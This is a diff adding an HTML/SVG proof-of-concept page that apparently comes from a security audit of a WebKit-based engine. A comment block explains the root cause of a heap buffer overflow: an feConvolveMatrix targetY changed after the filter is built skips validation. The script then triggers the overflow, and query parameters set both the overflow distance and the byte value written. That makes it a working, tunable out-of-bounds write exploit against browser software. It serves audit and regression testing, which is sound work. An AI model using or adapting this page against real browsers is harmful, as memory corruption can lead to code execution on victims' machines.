@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<meta charset="utf-8">
+<title>feconvolve-target: heap overflow via a dynamically invalid feConvolveMatrix target offset</title>
+<!--
+  Audit item #5 (docs/V19-FIX-DELTA.md).
+
+  The static path is already checked in 19.0.0: SVGFEConvolveMatrixElement::
+  createFilterEffect() (build) returns nullptr when a *present* targetX/targetY
+  attribute is outside [0, order).  Declaring targetY="60" in the markup
+  therefore never produces an effect.
+
+  The dynamic path is not checked.  Once the filter has been built with a valid
+  target offset, changing it afterwards goes through
+  SVGFEConvolveMatrixElement::svgAttributeChanged() ->
+  SVGFilterPrimitiveStandardAttributes::primitiveAttributeChanged() ->
+  setFilterEffectAttribute() -> FEConvolveMatrix::setTargetOffset(), which
+  mutates the *existing* effect and then only calls markFilterEffectForRepaint().
+  No rebuild, so the out-of-range offset reaches the applier.
+
+  FEConvolveMatrixSoftwareApplier::applyPlatform() computes
+      clipRight  = width  - kernelWidth     (253 for 256x256, order 3)
+      clipBottom = height - kernelHeight    (253)
+  and setInteriorPixels() starts its write cursor at
+      (targetOffset.y * width + targetOffset.x) * 4
+  i.e. a whole kernel-height too far down the destination buffer, then walks
+  clipBottom + 1 rows of width*4 bytes past it.
+
+  With width == height == n and a 3x3 kernel, the first chunk of the parallel
+  split (yEnd = stride = clipBottom / (n*n/10000) == 42 for n in 255..260)
+  starts writing at
+      (targetY + clipBottom - stride) * n * 4
+  so targetY = stride + kernelHeight - 1 = 45 (with targetX = 0, also valid)
+  puts the very first write at byte offset n*n*4, exactly one byte past the end
+  of the n*n*4-byte destination pixel buffer: a deterministic one-byte ASAN
+  heap-buffer-overflow WRITE, and the run continues for ~n*4 bytes per row.  Larger values (e.g. 60) overrun
+  proportionally further -- 60 puts the first write 15 KiB past the end and the
+  last one ~58 KiB past -- but ASAN only reports it if that address happens to
+  fall in a redzone, so the page uses 45 by default.  ?targetY=60 overrides it.
+
+  Upstream fix 3cfb6575ec08 (bug 253721, May 2023) added the
+  isValidTargetXOffset()/isValidTargetYOffset() revalidation in
+  svgAttributeChanged(); WebKitGTK 2.40.5 and 2.54.2 carry it unconditionally,
+  23.0.1 carries it only inside "#if PLATFORM(WKC)", and 19.0.0 has only the
+  build-time comparison -- so on 19.0.0 the dynamic path is open.
+-->
+<svg xmlns="http://www.w3.org/2000/svg" width="256" height="256">
+  <defs>
+    <filter id="f" filterUnits="userSpaceOnUse" x="0" y="0" width="256" height="256">
+      <feConvolveMatrix id="m" in="SourceGraphic" order="3"
+                        kernelMatrix="0 0 0 0 0 0 0 0 0"
+                        divisor="1" bias="65" targetX="0" targetY="1"></feConvolveMatrix>
+    </filter>
+  </defs>
+  <rect id="r" x="0" y="0" width="256" height="256" fill="#123456" filter="url(#f)"></rect>
+</svg>
+<script>
+function log(m) {
+  document.title = m;
+  if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.log) {
+    try { window.webkit.messageHandlers.log.postMessage(m); } catch (e) {}
+  }
+  try { console.log(m); } catch (e) {}
+}
+
+const qs = new URLSearchParams(location.search);
+const TARGET_Y = Number(qs.get("targetY") || 45);
+// Every byte the applier writes is clamp(totals / divisor + bias).  With an
+// all-zero kernel and divisor 1 that is exactly clamp(bias), so ?bias=<0..255>
+// makes the overflowing bytes a constant the page chose.
+const BIAS = Number(qs.get("bias") || 65);
+m.setAttribute("bias", String(BIAS));
+let step = 0;
+
+function tick() {
+  step++;
+  if (step === 1) {
+    log("frame 1: filter is built with the valid target offset (0,1), bias " + BIAS +
+        " (every written byte will be " + BIAS + " = 0x" + BIAS.toString(16) + ")");
+    requestAnimationFrame(tick);
+    return;
+  }
+  if (step === 2) {
+    log("setting targetY.baseVal = " + TARGET_Y + " (order is 3, so the valid range is 0..2)");
+    m.targetY.baseVal = TARGET_Y;
+    requestAnimationFrame(tick);
+    return;
+  }
+  if (step === 3) {
+    log("repainting the filtered rect: the applier now runs with targetOffset.y = " + m.targetY.baseVal);
+    r.setAttribute("fill", "#654321");
+    requestAnimationFrame(tick);
+    return;
+  }
+  if (step === 4) {
+    log("still alive after the repaint; expected first write is byte " +
+        (256 * 4 * (TARGET_Y + 253 - 42)) + " against a " +
+        (256 * 256 * 4) + "-byte buffer");
+  }
+  r.setAttribute("fill", (step & 1) ? "#123456" : "#654321");
+  requestAnimationFrame(tick);
+}
+
+requestAnimationFrame(tick);
+setTimeout(function () { log("page ran for 8 s without the process dying"); }, 8000);
+</script>
